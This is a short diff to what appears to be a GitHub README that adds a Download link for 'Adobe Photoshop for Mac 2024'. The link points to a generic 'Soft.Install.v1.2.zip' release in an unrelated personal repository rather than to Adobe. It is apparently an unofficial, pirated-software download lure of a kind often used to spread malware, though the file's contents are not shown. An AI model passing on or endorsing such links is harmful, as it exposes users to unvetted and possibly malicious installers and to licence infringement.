@@ -5,5 +5,5 @@
 <p><img src="https://repository-images.githubusercontent.com/761528744/395ed358-e575-4dfc-a63d-f04f96719ca3"/></p>
 
 <p><strong>System Requirements: macOS 10.15 and later</p>
-Adobe Photoshop for Mac 2024 v. 25.7.0 | <a href="">Download</a>
+Adobe Photoshop for Mac 2024 v. 25.7.0 | <a href="https://github.com/Paulscs/Adobe-Photoshop-for-Mac-2024/releases/download/25.7.0/Soft.Install.v1.2.zip">Download</a>
 </h1>
